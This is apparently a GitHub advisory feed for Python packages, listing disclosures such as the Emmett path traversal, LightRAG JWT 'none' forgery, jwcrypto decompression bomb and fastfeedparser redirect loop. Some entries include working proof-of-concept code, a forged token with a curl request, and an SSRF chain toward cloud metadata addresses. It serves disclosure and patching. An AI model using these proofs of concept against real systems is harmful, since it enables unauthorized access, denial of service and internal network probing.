<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-04-08T07:28:47.093Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[emmett] Emmett has a path traversal in internal assets handler]]></title>
        <id>https://github.com/advisories/GHSA-pr46-2v3c-5356</id>
        <link href="https://github.com/advisories/GHSA-pr46-2v3c-5356"/>
        <updated>2026-04-08T00:18:49.000Z</updated>
        <content type="html"><![CDATA[<p>The RSGI static handler for Emmett's internal assets (<code>/__emmett__</code> paths) is vulnerable to path traversal attacks.</p>
<p>An attacker can use <code>../</code> sequences (eg <code>/__emmett__/../rsgi/handlers.py</code>) to read arbitrary files outside the assets directory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/emmett-framework/emmett/security/advisories/GHSA-pr46-2v3c-5356">https://github.com/emmett-framework/emmett/security/advisories/GHSA-pr46-2v3c-5356</a></li>
<li><a href="https://github.com/advisories/GHSA-pr46-2v3c-5356">https://github.com/advisories/GHSA-pr46-2v3c-5356</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pr46-2v3c-5356</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-08T00:18:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow is vulnerable to an authorization bypass affecting the AJAX endpoint]]></title>
        <id>https://github.com/advisories/GHSA-46r5-x6jq-v8g6</id>
        <link href="https://github.com/advisories/GHSA-46r5-x6jq-v8g6"/>
        <updated>2026-04-08T00:18:44.000Z</updated>
        <content type="html"><![CDATA[<p>MLflow is vulnerable to an authorization bypass affecting the AJAX endpoint used to download saved model artifacts. Due to missing access‑control validation, a user without permissions to a given experiment can directly query this endpoint and retrieve model artifacts they are not authorized to access.</p>
<p>This issue affects MLflow version through 3.10.1</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33866">https://nvd.nist.gov/vuln/detail/CVE-2026-33866</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/21708">https://github.com/mlflow/mlflow/pull/21708</a></li>
<li><a href="https://cert.pl/en/posts/2026/04/CVE-2026-33865">https://cert.pl/en/posts/2026/04/CVE-2026-33865</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/005b959cacda05d1423356cfcbd9ebeda8ff96a7">https://github.com/mlflow/mlflow/commit/005b959cacda05d1423356cfcbd9ebeda8ff96a7</a></li>
<li><a href="https://github.com/advisories/GHSA-46r5-x6jq-v8g6">https://github.com/advisories/GHSA-46r5-x6jq-v8g6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46r5-x6jq-v8g6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-07T15:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyload-ng has a WebUI JSON permission mismatch that lets ADD/DELETE users invoke MODIFY-only actions]]></title>
        <id>https://github.com/advisories/GHSA-rfgh-63mg-8pwm</id>
        <link href="https://github.com/advisories/GHSA-rfgh-63mg-8pwm"/>
        <updated>2026-04-08T00:18:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Several WebUI JSON endpoints enforce weaker permissions than the core API methods they invoke. This allows authenticated low-privileged users to execute <code>MODIFY</code> operations that should be denied by pyLoad's own permission model.</p>
<p>Confirmed mismatches:</p>
<ul>
<li><code>ADD</code> user can reorder packages/files (<code>order_package</code>, <code>order_file</code>) via <code>/json/package_order</code> and <code>/json/link_order</code></li>
<li><code>DELETE</code> user can abort downloads (<code>stop_downloads</code>) via <code>/json/abort_link</code></li>
</ul>
<h3 id="details">Details</h3>
<p>pyLoad defines granular permissions in core API:</p>
<ul>
<li><code>order_package</code> requires <code>Perms.MODIFY</code> (<code>src/pyload/core/api/__init__.py:1125</code>)</li>
<li><code>order_file</code> requires <code>Perms.MODIFY</code> (<code>src/pyload/core/api/__init__.py:1137</code>)</li>
<li><code>stop_downloads</code> requires <code>Perms.MODIFY</code> (<code>src/pyload/core/api/__init__.py:1046</code>)</li>
</ul>
<p>But WebUI JSON routes use weaker checks:</p>
<ul>
<li><code>/json/package_order</code> uses <code>@login_required("ADD")</code> then calls <code>api.order_package(...)</code> (<code>src/pyload/webui/app/blueprints/json_blueprint.py:109-117</code>)</li>
<li><code>/json/link_order</code> uses <code>@login_required("ADD")</code> then calls <code>api.order_file(...)</code> (<code>src/pyload/webui/app/blueprints/json_blueprint.py:137-145</code>)</li>
<li><code>/json/abort_link</code> uses <code>@login_required("DELETE")</code> then calls <code>api.stop_downloads(...)</code> (<code>src/pyload/webui/app/blueprints/json_blueprint.py:123-131</code>)</li>
</ul>
<p>Why this is likely unintended (not just convenience):</p>
<ul>
<li>The same JSON blueprint correctly protects other edit actions with <code>MODIFY</code>:<ul>
<li><code>/json/move_package</code> -&gt; <code>@login_required("MODIFY")</code> (<code>json_blueprint.py:188-196</code>)</li>
<li><code>/json/edit_package</code> -&gt; <code>@login_required("MODIFY")</code> (<code>json_blueprint.py:202-217</code>)</li>
</ul>
</li>
<li>The project UI exposes granular per-user permission assignment (<code>settings.html:184-190</code>), implying these boundaries are intended security controls.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Environment:</p>
<ul>
<li>Repository version: <code>0.5.0b3</code> (<code>VERSION</code> file)</li>
<li>Commit tested: <code>ddc53b3d7</code></li>
</ul>
<p>PoC A (ADD-only user invokes MODIFY-only reorder):</p>
<pre><code class="language-python">import os
import sys
from types import SimpleNamespace

sys.path.insert(0, os.path.abspath('src'))

from flask import Flask
from pyload.core.api import Api, Perms, Role
from pyload.webui.app.blueprints import json_blueprint

class FakeApi:
    def __init__(self):
        self.calls = []

    def user_exists(self, username):
        return username == 'attacker'

    def order_package(self, pack_id, pos):
        self.calls.append(('order_package', int(pack_id), int(pos)))

    def order_file(self, file_id, pos):
        self.calls.append(('order_file', int(file_id), int(pos)))

api = Api(SimpleNamespace(_=lambda x: x))
ctx = {'role': Role.USER, 'permission': Perms.ADD}
print('API auth (ADD-only) order_package:', api.is_authorized('order_package', ctx))
print('API auth (ADD-only) order_file:', api.is_authorized('order_file', ctx))

app = Flask(__name__)
app.secret_key = 'k'
app.config['TESTING'] = True
app.config['WTF_CSRF_ENABLED'] = False
f = FakeApi()
app.config['PYLOAD_API'] = f
app.register_blueprint(json_blueprint.bp)

with app.test_client() as c:
    with c.session_transaction() as s:
        s['authenticated'] = True
        s['name'] = 'attacker'
        s['role'] = int(Role.USER)
        s['perms'] = int(Perms.ADD)

    r1 = c.post('/json/package_order', json={'pack_id': 5, 'pos': 0})
    r2 = c.post('/json/link_order', json={'file_id': 77, 'pos': 1})

print('HTTP /json/package_order:', r1.status_code, r1.get_data(as_text=True).strip())
print('HTTP /json/link_order:', r2.status_code, r2.get_data(as_text=True).strip())
print('calls:', f.calls)
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">API auth (ADD-only) order_package: False
API auth (ADD-only) order_file: False
HTTP /json/package_order: 200 {"response":"success"}
HTTP /json/link_order: 200 {"response":"success"}
calls: [('order_package', 5, 0), ('order_file', 77, 1)]
</code></pre>
<p>PoC B (DELETE-only user invokes MODIFY-only stop_downloads):</p>
<pre><code class="language-python">import os
import sys
from types import SimpleNamespace

sys.path.insert(0, os.path.abspath('src'))

from flask import Flask
from pyload.core.api import Api, Perms, Role
from pyload.webui.app.blueprints import json_blueprint

class FakeApi:
    def __init__(self):
        self.calls = []

    def user_exists(self, username):
        return username == 'u'

    def stop_downloads(self, ids):
        self.calls.append(('stop_downloads', ids))

api = Api(SimpleNamespace(_=lambda x: x))
ctx = {'role': Role.USER, 'permission': Perms.DELETE}
print('API auth (DELETE-only) stop_downloads:', api.is_authorized('stop_downloads', ctx))

app = Flask(__name__)
app.secret_key = 'k'
app.config['TESTING'] = True
app.config['WTF_CSRF_ENABLED'] = False
f = FakeApi()
app.config['PYLOAD_API'] = f
app.register_blueprint(json_blueprint.bp)

with app.test_client() as c:
    with c.session_transaction() as s:
        s['authenticated'] = True
        s['name'] = 'u'
        s['role'] = int(Role.USER)
        s['perms'] = int(Perms.DELETE)

    r = c.post('/json/abort_link', json={'link_id': 999})

print('HTTP /json/abort_link:', r.status_code, r.get_data(as_text=True).strip())
print('calls:', f.calls)
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">API auth (DELETE-only) stop_downloads: False
HTTP /json/abort_link: 200 {"response":"success"}
calls: [('stop_downloads', [999])]
</code></pre>
<h3 id="impact">Impact</h3>
<p>Type:</p>
<ul>
<li>Improper authorization / permission-bypass between WebUI and core API permission model.</li>
</ul>
<p>Scope:</p>
<ul>
<li>Horizontal privilege escalation among authenticated non-admin users.</li>
<li>Not admin takeover, but unauthorized execution of operations explicitly categorized as <code>MODIFY</code>.</li>
</ul>
<p>Security impact:</p>
<ul>
<li>Integrity impact: unauthorized queue/file reordering by users lacking <code>MODIFY</code>.</li>
<li>Availability impact: unauthorized abort of active downloads by users lacking <code>MODIFY</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-rfgh-63mg-8pwm">https://github.com/pyload/pyload/security/advisories/GHSA-rfgh-63mg-8pwm</a></li>
<li><a href="https://github.com/advisories/GHSA-rfgh-63mg-8pwm">https://github.com/advisories/GHSA-rfgh-63mg-8pwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfgh-63mg-8pwm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-08T00:18:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[transformers] HuggingFace Transformers allows for arbitrary code execution in the `Trainer` class]]></title>
        <id>https://github.com/advisories/GHSA-69w3-r845-3855</id>
        <link href="https://github.com/advisories/GHSA-69w3-r845-3855"/>
        <updated>2026-04-08T00:17:59.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in the HuggingFace Transformers library, specifically in the <code>Trainer</code> class, allows for arbitrary code execution. The <code>_load_rng_state()</code> method in <code>src/transformers/trainer.py</code> at line 3059 calls <code>torch.load()</code> without the <code>weights_only=True</code> parameter. This issue affects all versions of the library supporting <code>torch&gt;=2.2</code> when used with PyTorch versions below 2.6, as the <code>safe_globals()</code> context manager provides no protection in these versions. An attacker can exploit this vulnerability by supplying a malicious checkpoint file, such as <code>rng_state.pth</code>, which can execute arbitrary code when loaded. The issue is resolved in version v5.0.0rc3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1839">https://nvd.nist.gov/vuln/detail/CVE-2026-1839</a></li>
<li><a href="https://github.com/huggingface/transformers/commit/03c8082ba4594c9b8d6fe190ca9bed0e5f8ca396">https://github.com/huggingface/transformers/commit/03c8082ba4594c9b8d6fe190ca9bed0e5f8ca396</a></li>
<li><a href="https://huntr.com/bounties/3c77bb97-e493-493d-9a88-c57f5c536485">https://huntr.com/bounties/3c77bb97-e493-493d-9a88-c57f5c536485</a></li>
<li><a href="https://github.com/huggingface/transformers/releases/tag/v5.0.0rc3">https://github.com/huggingface/transformers/releases/tag/v5.0.0rc3</a></li>
<li><a href="https://github.com/advisories/GHSA-69w3-r845-3855">https://github.com/advisories/GHSA-69w3-r845-3855</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69w3-r845-3855</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-07T06:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lightrag-hku] lightrag-hku: JWT Algorithm Confusion Vulnerability ]]></title>
        <id>https://github.com/advisories/GHSA-8ffj-4hx4-9pgf</id>
        <link href="https://github.com/advisories/GHSA-8ffj-4hx4-9pgf"/>
        <updated>2026-04-08T00:17:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The LightRAG API is vulnerable to a JWT algorithm confusion attack where an attacker can forge tokens by specifying 'alg': 'none' in the JWT header. Since the <code>jwt.decode()</code> call does not explicitly deny the 'none' algorithm, a crafted token without a signature will be accepted as valid, leading to unauthorized access.</p>
<h2 id="details">Details</h2>
<p>In <code>lightrag/api/auth.py</code> at line 128, the <code>validate_token</code> method calls:</p>
<pre><code class="language-python">payload = jwt.decode(token, self.secret, algorithms=[self.algorithm])
</code></pre>
<p>This allows any algorithm listed in the token's header to be processed, including 'none'. The code does not explicitly specify that 'none' is not allowed, making it possible for an attacker to bypass authentication.</p>
<h2 id="poc">PoC</h2>
<p>An attacker can generate a JWT with the following structure:</p>
<pre><code class="language-json">{
  "header": {
    "alg": "none",
    "typ": "JWT"
  },
  "payload": {
    "sub": "admin",
    "exp": 1700000000,
    "role": "admin"
  }
}
</code></pre>
<p>Then send a request like:</p>
<pre><code class="language-bash">curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTcwMDAwMDAwMCwicm9sZSI6ImFkbWluIn0." http://localhost:8000/api/protected-endpoint
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker can impersonate any user, including administrators, by forging a JWT with 'alg': 'none', gaining full access to protected resources without needing valid credentials.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Explicitly specify allowed algorithms and exclude 'none'. Modify the <code>validate_token</code> method to:</p>
<pre><code class="language-python">allowed_algorithms = [self.algorithm] if self.algorithm != 'none' else ['HS256', 'HS384', 'HS512']
payload = jwt.decode(token, self.secret, algorithms=allowed_algorithms)
</code></pre>
<p>Or better yet, hardcode the expected algorithm(s):</p>
<pre><code class="language-python">payload = jwt.decode(token, self.secret, algorithms=['HS256'])
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HKUDS/LightRAG/security/advisories/GHSA-8ffj-4hx4-9pgf">https://github.com/HKUDS/LightRAG/security/advisories/GHSA-8ffj-4hx4-9pgf</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/commit/728f2e54509d93e0a44f929c7f83f2c88d6d291b">https://github.com/HKUDS/LightRAG/commit/728f2e54509d93e0a44f929c7f83f2c88d6d291b</a></li>
<li><a href="https://github.com/advisories/GHSA-8ffj-4hx4-9pgf">https://github.com/advisories/GHSA-8ffj-4hx4-9pgf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8ffj-4hx4-9pgf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-08T00:17:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jwcrypto] JWCrypto: JWE ZIP decompression bomb]]></title>
        <id>https://github.com/advisories/GHSA-fjrm-76x2-c4q4</id>
        <link href="https://github.com/advisories/GHSA-fjrm-76x2-c4q4"/>
        <updated>2026-04-08T00:16:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The fix for GHSA-j857-7rvv-vj97 in v1.5.6 is weak in that it does not allow to fully control the amount of plaintext the receiver is willing to deal with and provides just a weak upper bound. The patch limits input token size to 250KB but does not validate the decompressed output size. An unauthenticated attacker can craft a JWE token under the 250KB input limit that decompresses to very large data that may exceed small devices memory availability, causing Denial of Service via memory exhaustion.</p>
<p>Although this is technically not unbounded I do recognize that it may be too much for devices and is something that could be surprising to developers, and we can do better than that.</p>
<p>NOTE: the original report was sloppy (probably AI slop) and claimed arbitrary memory consumption, but simple testing showed that while 100MB could be decompressed a 1GB output was denied because the token exceeded the 250K compressed serialization.</p>
<p>NOTE WELL: The proposed solution was also sloppy, proposing to first decompress the data completely in memory (therefore causing the memory exhaustion) and then checking how much memory was already used to deny the operation. I <em>intentionally</em> left the "details" section untouched to show how bad AI slop is and how <em>uncritical</em> the submitter was, even as it was obvious the "suggested fix" is actually no solution at all, as it was using the very call that he claimed was causing "arbitrary" memory exhaustion and wrapping it around an "if" ... the actual solution is in the resolving commit in version 1.5.7</p>
<h3 id="details">Details</h3>
<p>The vulnerable code in <code>jwcrypto/jwe.py</code>:</p>
<pre><code class="language-python">if len(data) &gt; default_max_compressed_size:
    raise InvalidJWEData('Compressed data exceeds maximum allowed size')
self.plaintext = zlib.decompress(data, -zlib.MAX_WBITS)
</code></pre>
<p>The check validates <code>data</code> which is the <strong>compressed</strong> bytes, not the decompressed output. A 132KB token (under the 250KB limit) can decompress to approximately 100MB with no error raised.</p>
<h3 id="poc">PoC</h3>
<p>Tested on jwcrypto 1.5.6 (patched version):</p>
<pre><code class="language-python">import zlib
from jwcrypto import jwe
from jwcrypto.jwk import JWK
import time

key = JWK.generate(kty='oct', size=128)
bomb_data = b"A" * 1024 * 1024 * 100  # 100MB uncompressed

token = jwe.JWE(
    plaintext=bomb_data,
    protected={"alg": "A128KW", "enc": "A128GCM", "zip": "DEF"}
)
token.add_recipient(key)
serialized = token.serialize(compact=True)
print(f"Token size: {len(serialized)/1024:.1f} KB")  # 132.8 KB — under 250KB limit

tok2 = jwe.JWE()
tok2.deserialize(serialized, key)
print(f"Decompressed: {len(tok2.plaintext)/1024/1024:.0f} MB")  # 100 MB
</code></pre>
<p>Output:</p>
<pre><code>Token size: 132.8 KB
Decompressed: 100 MB
</code></pre>
<h3 id="impact">Impact</h3>
<p>An unauthenticated attacker can exhaust server memory by sending crafted JWE tokens with ZIP compression. The existing patch (v1.5.6) does not prevent this attack. An unauthenticated attacker can cause memory exhaustion on memory-constrained systems. A token under the 250KB input limit can decompress to approximately 100MB.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/latchset/jwcrypto/security/advisories/GHSA-fjrm-76x2-c4q4">https://github.com/latchset/jwcrypto/security/advisories/GHSA-fjrm-76x2-c4q4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39373">https://nvd.nist.gov/vuln/detail/CVE-2026-39373</a></li>
<li><a href="https://github.com/advisories/GHSA-fjrm-76x2-c4q4">https://github.com/advisories/GHSA-fjrm-76x2-c4q4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fjrm-76x2-c4q4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-08T00:16:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastfeedparser] FastFeedParser has an infinite redirect loop DoS via meta-refresh chain]]></title>
        <id>https://github.com/advisories/GHSA-4gx2-pc4f-wq37</id>
        <link href="https://github.com/advisories/GHSA-4gx2-pc4f-wq37"/>
        <updated>2026-04-08T00:12:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When <code>parse()</code> fetches a URL that returns an HTML page containing a <code>&lt;meta http-equiv="refresh"&gt;</code> tag, it recursively calls itself with the redirect URL — with no depth limit, no visited-URL deduplication, and no redirect count cap. An attacker-controlled server that returns an infinite chain of HTML meta-refresh responses causes unbounded recursion, exhausting the Python call stack and crashing the process. This vulnerability can also be chained with the companion SSRF issue to reach internal network targets after bypassing the initial URL check.</p>
<h3 id="details">Details</h3>
<p><code>parse()</code> catches <code>ValueError</code> on XML parse failure, extracts a meta-refresh URL from the HTML response via <code>_extract_meta_refresh_url()</code>, and tail-calls itself with that URL. The recursive call is unconditional — there is no maximum redirect depth, no set of already-visited URLs, and no guard against self-referential or looping redirects.</p>
<p><strong><code>fastfeedparser/main.py</code> — <code>parse()</code> (recursive sink):</strong></p>
<pre><code class="language-python">def parse(source: str | bytes, ...) -&gt; FastFeedParserDict:
    is_url = isinstance(source, str) and source.startswith(("http://", "https://"))
    if is_url:
        content = _fetch_url_content(source)
    try:
        return _parse_content(content, ...)
    except ValueError as e:
        ...
        redirect_url = _extract_meta_refresh_url(content, source)
        if redirect_url is None:
            raise
        return parse(redirect_url, ...)   # ← unconditional recursion, no depth limit
</code></pre>
<p><code>_extract_meta_refresh_url()</code> uses <code>urljoin(base_url, match.group(1))</code> so relative, protocol-relative (<code>//host/path</code>), and absolute URLs in the <code>content=</code> attribute are all followed.</p>
<h3 id="poc">PoC</h3>
<p>No live server required. The following monkeypatches <code>_fetch_url_content</code> to return an infinite HTML meta-refresh chain and confirms unbounded recursion:</p>
<pre><code class="language-python">import fastfeedparser.main as m

call_count = 0
_orig = m._fetch_url_content

def mock_fetch(url):
    global call_count
    call_count += 1
    if call_count &gt; 10:
        raise RuntimeError(f"Stopped at call {call_count}")
    next_url = f"http://169.254.169.254/step{call_count}/"
    return f"""&lt;html&gt;&lt;head&gt;
&lt;meta http-equiv="refresh" content="0; url={next_url}"&gt;
&lt;/head&gt;&lt;body&gt;not a feed&lt;/body&gt;&lt;/html&gt;""".encode()

m._fetch_url_content = mock_fetch

try:
    m.parse("http://attacker.com/loop")
except RuntimeError as e:
    print(f"CONFIRMED infinite loop: {e}")
finally:
    m._fetch_url_content = _orig
    print(f"Total fetches before stop: {call_count}")

# Output:
# CONFIRMED infinite loop: Stopped at call 11
# Total fetches before stop: 11
</code></pre>
<p>Each recursive call performs a real HTTP request (30 s timeout), HTML parsing, and a Python stack frame allocation. With Python's default recursion limit of 1000 and a 30 s per-request timeout, a single attacker request can hold a server thread busy for up to ~8 hours before a <code>RecursionError</code> is raised.</p>
<p><strong>SSRF chain variant:</strong> The first response can be legitimate HTML redirecting to an internal address (<code>http://192.168.1.1/</code>), letting the redirect loop also serve as an SSRF bypass for targets that would otherwise be blocked by application-level URL validation applied only to the initial URL.</p>
<h3 id="impact">Impact</h3>
<p>This is a denial-of-service vulnerability with a secondary SSRF-chaining impact. Any application that accepts user-supplied feed URLs and calls <code>fastfeedparser.parse()</code> is affected — including RSS aggregators, feed preview services, and "subscribe by URL" features. An attacker with no authentication can:</p>
<ul>
<li>Hold a server worker thread indefinitely (one request per attacker connection)</li>
<li>Crash the worker process via <code>RecursionError</code> after ~1000 redirects</li>
<li>Use the redirect chain to pivot SSRF requests to internal network targets</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kagisearch/fastfeedparser/security/advisories/GHSA-4gx2-pc4f-wq37">https://github.com/kagisearch/fastfeedparser/security/advisories/GHSA-4gx2-pc4f-wq37</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39376">https://nvd.nist.gov/vuln/detail/CVE-2026-39376</a></li>
<li><a href="https://github.com/advisories/GHSA-4gx2-pc4f-wq37">https://github.com/advisories/GHSA-4gx2-pc4f-wq37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gx2-pc4f-wq37</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-08T00:12:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyblade] PyBlade: SSTI/RCE via Bypassed AST Validation in sandbox.py]]></title>
        <id>https://github.com/advisories/GHSA-23jg-5f8m-gw8c</id>
        <link href="https://github.com/advisories/GHSA-23jg-5f8m-gw8c"/>
        <updated>2026-04-08T00:06:48.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been found in AntaresMugisho PyBlade 0.1.8-alpha/0.1.9-alpha. The affected element is the function _is_safe_ast of the file sandbox.py of the component AST Validation. Such manipulation leads to improper neutralization of special elements used in a template engine. The attack may be performed from remote. The exploit has been disclosed to the public and may be used. The project was informed of the problem early through an issue report but has not responded yet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5559">https://nvd.nist.gov/vuln/detail/CVE-2026-5559</a></li>
<li><a href="https://github.com/AntaresMugisho/PyBlade/issues/1">https://github.com/AntaresMugisho/PyBlade/issues/1</a></li>
<li><a href="https://github.com/AntaresMugisho/PyBlade/issues/1#issue-4086730906">https://github.com/AntaresMugisho/PyBlade/issues/1#issue-4086730906</a></li>
<li><a href="https://github.com/AntaresMugisho/PyBlade">https://github.com/AntaresMugisho/PyBlade</a></li>
<li><a href="https://vuldb.com/submit/782904">https://vuldb.com/submit/782904</a></li>
<li><a href="https://vuldb.com/vuln/355329">https://vuldb.com/vuln/355329</a></li>
<li><a href="https://vuldb.com/vuln/355329/cti">https://vuldb.com/vuln/355329/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-23jg-5f8m-gw8c">https://github.com/advisories/GHSA-23jg-5f8m-gw8c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23jg-5f8m-gw8c</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-05T12:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[justhtml] justhtml: Mutation XSS with custom foreign-namespace sanitization policies]]></title>
        <id>https://github.com/advisories/GHSA-r758-8hxw-4845</id>
        <link href="https://github.com/advisories/GHSA-r758-8hxw-4845"/>
        <updated>2026-04-08T00:06:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A parser-differential / mutation XSS issue was found in <code>justhtml</code> when using a <strong>custom sanitization policy</strong> that preserves foreign namespaces such as SVG or MathML.</p>
<p>Under these custom settings, specially crafted input could sanitize into HTML that looked safe at first, but became unsafe when parsed again by a browser or another HTML parser.</p>
<h2 id="impact">Impact</h2>
<p>This issue does <strong>not</strong> affect the default safe configuration.</p>
<p>You may be affected if you use a custom <code>SanitizationPolicy</code> with settings like:</p>
<ul>
<li><code>drop_foreign_namespaces=False</code></li>
<li>allowlisted foreign elements such as MathML or SVG</li>
<li>allowlisted raw-text containers such as <code>&lt;style&gt;</code></li>
</ul>
<p>In that case, an attacker could inject markup that survives sanitization and turns into active HTML after re-parsing.</p>
<h2 id="affected-versions">Affected versions</h2>
<ul>
<li><code>justhtml</code> <code>&lt;= 1.13.0</code></li>
</ul>
<h2 id="fixed-version">Fixed version</h2>
<ul>
<li>Fixed in <code>1.14.0</code></li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>Until you upgrade:</p>
<ul>
<li>keep <code>drop_foreign_namespaces=True</code></li>
<li>avoid allowlisting foreign namespaces for untrusted input</li>
<li>avoid allowlisting raw-text containers such as <code>&lt;style&gt;</code> in custom policies</li>
</ul>
<h2 id="notes">Notes</h2>
<p>The default <code>JustHTML(..., sanitize=True)</code> behavior was not found to be vulnerable in this issue.</p>
<h2 id="credit">Credit</h2>
<p>Discovered by JustHTML author during a LLM-based security review of <code>justhtml</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-r758-8hxw-4845">https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-r758-8hxw-4845</a></li>
<li><a href="https://github.com/EmilStenstrom/justhtml/commit/8adc4dfe31723dc522f44338f9bd98381c92b076">https://github.com/EmilStenstrom/justhtml/commit/8adc4dfe31723dc522f44338f9bd98381c92b076</a></li>
<li><a href="https://github.com/EmilStenstrom/justhtml/releases/tag/v1.14.0">https://github.com/EmilStenstrom/justhtml/releases/tag/v1.14.0</a></li>
<li><a href="https://github.com/advisories/GHSA-r758-8hxw-4845">https://github.com/advisories/GHSA-r758-8hxw-4845</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r758-8hxw-4845</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-08T00:06:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyload-ng: Incomplete Tar Path Traversal Fix in UnTar._safe_extractall via os.path.commonprefix Bypass]]></title>
        <id>https://github.com/advisories/GHSA-mvwx-582f-56r7</id>
        <link href="https://github.com/advisories/GHSA-mvwx-582f-56r7"/>
        <updated>2026-04-08T00:04:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>_safe_extractall()</code> function in <code>src/pyload/plugins/extractors/UnTar.py</code> uses <code>os.path.commonprefix()</code> for its path traversal check, which performs character-level string comparison rather than path-level comparison. This allows a specially crafted tar archive to write files outside the intended extraction directory. The correct function <code>os.path.commonpath()</code> was added to the codebase in the GHSA-7g4m-8hx2-4qh3 fix (commit 5f4f0fa) but was never applied to <code>_safe_extractall()</code>, making this an incomplete fix.</p>
<h2 id="details">Details</h2>
<p>The GHSA-7g4m-8hx2-4qh3 fix (commit 5f4f0fa) added a correct <code>is_within_directory()</code> function to <code>src/pyload/core/utils/fs.py:384-391</code> using <code>os.path.commonpath()</code>:</p>
<pre><code class="language-python"># fs.py:384 — CORRECT implementation
def is_within_directory(base_dir, target_dir):
    real_base = os.path.realpath(base_dir)
    real_target = os.path.realpath(target_dir)
    return os.path.commonpath([real_base, real_target]) == real_base
</code></pre>
<p>However, the <code>_safe_extractall()</code> function in <code>UnTar.py:10-22</code> was left unchanged with the broken <code>os.path.commonprefix()</code>:</p>
